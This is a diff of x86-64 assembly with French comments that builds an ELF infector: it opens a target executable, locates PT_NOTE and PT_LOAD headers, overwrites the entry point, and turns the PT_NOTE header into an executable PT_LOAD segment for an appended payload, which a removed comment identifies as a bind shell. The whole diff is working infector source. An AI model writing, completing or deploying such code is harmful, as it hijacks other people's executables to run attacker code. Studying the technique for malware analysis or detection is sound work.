@@ -15,6 +15,8 @@ section .bss
 	pt_load_sav resq 1
 	last_load_end resq 1
 
+	pt_note_offset resq 1
+
 	p_flags resd 1
 	p_offset resq 1
 	p_vaddr resq 1
@@ -35,7 +37,8 @@ section .bss
 	new_p_memsz resq 1
 	new_p_align resq 1
 
-payload_size    resq 1
+	payload_size resq 1
+	program_header_buff resb 56
 
 section .text
 
@@ -46,170 +49,216 @@ _start:
 	mov rdi, nomelf
 	mov rsi, 2
 	mov rdx, 0
-	syscall 	; Ouvrir ELF en lecture écriture
+	syscall				; Ouvrir ELF en lecture/écriture
 
-	mov r8, rax
+	mov r8, rax			; Sauvegarder le fd
 
 	mov rax, 0
 	mov rdi, r8
 	mov rsi, elfheader
 	mov rdx, 64
-	syscall 	; Lire ELF Header
+	syscall				; Lire l'ELF Header
 
 	mov eax, [elfheader]
 	cmp eax, [vmagicnum]
-	jne erreur 	; Vérifier magic
+	jne erreur			; Vérifier le magic ELF
 
 	mov rax, [elfheader + 0x18]
-	mov [recup_e_entry], rax 	; Récupérer e_entry
+	mov [recup_e_entry], rax	; Récupérer e_entry
 
 	mov rax, [elfheader + 0x20]
-	mov [recup_e_phoff], rax 	; Récupérer e_phoff
+	mov [recup_e_phoff], rax	; Récupérer e_phoff
 
 	mov ax, [elfheader + 0x36]
-	mov [recup_e_phentsize], ax 	; Récupérer e_phentsize
+	mov [recup_e_phentsize], ax	; Récupérer e_phentsize
 
 	mov ax, [elfheader + 0x38]
-	mov [recup_phnum], ax 	; Récupérer e_phnum
+	mov [recup_phnum], ax		; Récupérer e_phnum
 
 	mov rax, 0
 	mov rdi, r8
 	mov rsi, elfdata
 	mov rdx, 4096
-	syscall 	; Lire la suite du fichier
+	syscall				; Lire les Program Headers
 
-	mov rcx, 0 	; i = 0
+	mov rcx, 0			; i = 0
 
 boucle_proghead:
-
 	movzx rdx, word [recup_phnum]
-	cmp rcx, rdx 	; i >= e_phnum ?
-	jae fin_recherche
+	cmp rcx, rdx
+	jae fin_recherche		; Si i >= e_phnum, terminer
 
-	mov rax, [recup_e_phoff] 	; RAX = e_phoff
+	mov rax, [recup_e_phoff]	; RAX = e_phoff
 
-	movzx rdx, word [recup_e_phentsize]	; RDX = e_phentsize
+	movzx rdx, word [recup_e_phentsize]
+	imul rdx, rcx			; RDX = i * e_phentsize
 
-	imul rdx, rcx 	; RDX = i * e_phentsize
+	add rax, rdx			; RAX = e_phoff + i * e_phentsize
+	sub rax, 64			; elfdata commence à l'offset 64
 
-	add rax, rdx 	; RAX = e_phoff + i * e_phentsize
-	sub rax, 64 	; elfdata commence à l'offset 64
 	mov edx, [elfdata + rax]	; Récupérer p_type
 
-	cmp edx, 4	; PT_NOTE = 4
-	je pt_note_trouve
+	cmp edx, 4
+	je pt_note_trouve		; PT_NOTE = 4
 
-	cmp edx, 1	; PT_LOAD = 1
-	je pt_load_trouve
+	cmp edx, 1
+	je pt_load_trouve		; PT_LOAD = 1
 
-	inc rcx 	; i++
+	inc rcx
 	jmp boucle_proghead
 
-
 pt_note_trouve:
+	cmp qword [pt_note_sav], 0
+	jne suite_boucle		; Ne garder que le premier PT_NOTE
 
-	cmp qword [pt_note_sav], 0	
-	jne suite_boucle			; Empecher d'écraser si il existe déjà un PT_NOTE trouvé
+	mov [pt_note_sav], rax		; Sauvegarder sa position dans elfdata
 
-	mov [pt_note_sav], rax		; Sauvegarder le premier PT_NOTE
+	mov rdx, [recup_e_phoff]
+	mov rax, rcx
+	movzx rsi, word [recup_e_phentsize]
+	imul rsi, rax
+	add rdx, rsi
+	mov [pt_note_offset], rdx	; Sauvegarder son offset fichier
 
 	jmp suite_boucle
 
-
 pt_load_trouve:
+	mov [pt_load_sav], rax		; Sauvegarder le PT_LOAD
 
-	mov [pt_load_sav], rax 	; RAX = position du PT_LOAD dans elfdata
+	mov edx, [elfdata + rax + 4]
+	mov [p_flags], edx		; Récupérer p_flags
 
-	mov edx, [elfdata + rax + 4]     ; p_flags   offset +4
-	mov [p_flags], edx
+	mov rdx, [elfdata + rax + 8]
+	mov [p_offset], rdx		; Récupérer p_offset
 
-	mov rdx, [elfdata + rax + 8]     ; p_offset  offset +8
-	mov [p_offset], rdx
+	mov rdx, [elfdata + rax + 16]
+	mov [p_vaddr], rdx		; Récupérer p_vaddr
 
-	mov rdx, [elfdata + rax + 16]     ; p_vaddr   offset +16
-	mov [p_vaddr], rdx
+	mov rdx, [elfdata + rax + 32]
+	mov [p_filesz], rdx		; Récupérer p_filesz
 
-	mov rdx, [elfdata + rax + 32]     ; p_filesz  offset +32
-	mov [p_filesz], rdx
+	mov rdx, [elfdata + rax + 40]
+	mov [p_memsz], rdx		; Récupérer p_memsz
 
-	mov rdx, [elfdata + rax + 40]     ; p_memsz   offset +40
-	mov [p_memsz], rdx
-
-	mov rdx, [elfdata + rax + 48]     ; p_align   offset +48
-	mov [p_align], rdx
+	mov rdx, [elfdata + rax + 48]
+	mov [p_align], rdx		; Récupérer p_align
 
 	mov rax, [p_memsz]
 	sub rax, [p_filesz]
-	mov [espace_disponible], rax	 ; Espace mémoire potentiellement libre
+	mov [espace_disponible], rax	; Calculer espace mémoire disponible
 
 	mov rax, [p_vaddr]
-	add rax, [p_filesz]
-	add rax, 0x1000			; Prépare l'alignement
-	and rax, ~0xFFF			; Alignement sur 0x1000
+	add rax, [p_memsz]
+	add rax, 0x1000
+	and rax, ~0xFFF			; Aligner sur 0x1000
 
 	cmp rax, [last_load_end]
 	jle suite_boucle
 
-	mov [last_load_end], rax		; Conserver la plus grande adresse
+	mov [last_load_end], rax	; Conserver la plus grande adresse
 
 	jmp suite_boucle
 
-
 suite_boucle:
-
-	inc rcx 	; i++
+	inc rcx
 	jmp boucle_proghead
 
-
 fin_recherche:
-	mov r13, [last_load_end]        ; Nouvelle adresse virtuelle
+	mov r13, [last_load_end]
 	add r13, 0x1000
-	and r13, ~0xFFF
+	and r13, ~0xFFF			; Nouvelle adresse virtuelle alignée
 
 	mov rax, 8
 	mov rdi, r8
 	mov rsi, 0
-	mov rdx, 2		; SEEK_END = 2
-	syscall 		; rechercher la fin du ELF
+	mov rdx, 2
+	syscall				; Aller à la fin du fichier
 
-	mov r12, rax		; r12 = offset de fin du fichier
+	mov r12, rax			; R12 = offset de fin du fichier
 
 preparation_PT_LOAD:
-	mov dword [new_p_type], 1
+	mov dword [new_p_type], 1	; PT_LOAD
 
-	mov dword [new_p_flags], 5
+	mov dword [new_p_flags], 5	; PF_R | PF_X
 
 	mov rax, r12
-	; add rax, 0xFFF ici
-	; and rax, ~0xFFF  ici
-	mov [new_p_offset], rax ; Peut etre alignement à respecter
+	add rax, 0xFFF
+	and rax, ~0xFFF
+	mov [new_p_offset], rax		; Offset du payload dans le fichier
 
-	mov [new_p_vaddr], r13
+	mov [new_p_vaddr], r13		; Adresse virtuelle du payload
 
 	mov rax, [new_p_vaddr]
-	mov [new_p_paddr], rax
+	mov [new_p_paddr], rax		; Adresse physique
 
-	mov rax, [payload_size]		; A initialiser plus tard avec : stat -c %s bind_shell.asm
-	mov [new_p_filesz], rax
+	mov rax, [payload_size]
+	mov [new_p_filesz], rax		; Taille du payload dans le fichier
 
 	mov rax, [new_p_filesz]
-	mov [new_p_memsz], rax
+	mov [new_p_memsz], rax		; Taille du payload en mémoire
 
-	mov rax, [p_align]		; A faire correspondre a l'alignement de simple plus tard
-	mov [new_p_align], rax
+	mov rax, [p_align]
+	mov [new_p_align], rax		; Même alignement que les PT_LOAD existants
 
-	mov rax, [new_p_vaddr] ; Nouveau e_entry = new_e_entry / Ancien e_entry = recup_e_entry
-	mov [new_e_entry], rax
+	mov rax, [new_p_vaddr]
+	mov [new_e_entry], rax		; Nouveau point d'entrée
+
+	mov rax, 8
+	mov rdi, r8
+	mov rsi, 24
+	mov rdx, 0
+	syscall				; Aller à l'offset e_entry
+
+	mov rax, 1
+	mov rdi, r8
+	mov rsi, new_e_entry
+	mov rdx, 8
+	syscall				; Écrire le nouvel e_entry
+
+	mov dword [program_header_buff], 1	; p_type = PT_LOAD
+
+	mov r9d, [new_p_flags]
+	mov dword [program_header_buff + 4], r9d	; p_flags
+
+	mov r9, [new_p_offset]
+	mov qword [program_header_buff + 8], r9		; p_offset
+
+	mov r9, [new_p_vaddr]
+	mov qword [program_header_buff + 16], r9	; p_vaddr
+
+	mov r9, [new_p_paddr]
+	mov qword [program_header_buff + 24], r9	; p_paddr
+
+	mov r9, [payload_size]
+	mov qword [program_header_buff + 32], r9	; p_filesz
+
+	mov r9, [payload_size]
+	mov qword [program_header_buff + 40], r9	; p_memsz
+
+	mov r9, [new_p_align]
+	mov qword [program_header_buff + 48], r9	; p_align
+
+	mov rax, 8
+	mov rdi, r8
+	mov rsi, [pt_note_offset]
+	mov rdx, 0
+	syscall				; Aller à l'ancien PT_NOTE
+
+	mov rax, 1
+	mov rdi, r8
+	mov rsi, program_header_buff
+	mov rdx, 56
+	syscall				; Remplacer PT_NOTE par PT_LOAD
 
 	mov rax, 3
 	mov rdi, r8
-	syscall
+	syscall				; Fermer le fichier
 
 	mov rax, 60
 	mov rdi, 0
-	syscall
+	syscall				; Quitter proprement
 
 erreur:
 	mov rax, 60
 	mov rdi, 2
-	syscall
+	syscall				; Quitter avec erreur
